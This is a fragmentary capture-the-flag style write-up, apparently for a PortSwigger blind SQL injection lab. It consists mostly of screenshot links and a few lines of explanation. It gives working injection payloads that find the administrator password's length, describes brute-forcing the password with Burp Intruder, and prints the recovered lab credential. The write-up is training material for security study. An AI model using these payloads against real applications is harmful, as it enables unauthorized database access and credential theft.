...
![lab1](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr01.png)

![Homepage](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr02.png)
...
![Request](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr03.png)
...
![welcome back](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr04.png)

![modify query](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr05.png)
...
![modify 2](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr06.png)

![nothing](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr07.png)
...
![limit](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr08.png)
...
![where edit](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr09.png)
...
![length](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr10.png)
...
![greater than 10](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr11.png)

But `>20` does not and evaluates as false. 

`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'  

![greater than 20](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr12.png)
...
![greater than 19](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr13.png)

This can be confirmed by further editing the query so that the `>` operator is replaced with an `=` and the value set to `20`. 

`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a' 

![equal to](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr14.png)
...
![intruder](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr15.png)
...
![substring](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr16.png)
...
![section sign](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr17.png)
...
![set payload](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr18.png)
...
![grep match](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr19.png)
...
![start attack](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr20.png)

Sorting the results by the *Welcome back* tab I can see that the letter `h` is the first character in the password. 

![first letter](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr21.png)
...
![second character](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr22.png)
...
![interesting](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr23.png)

Using the credentials `administrator:husbldw9ywfjx1alq7eo` to log in completes the lab.

![Solved](../../../assets/images/portswigger/sqli/blindsqli/conditionalresponses/cr24.png)
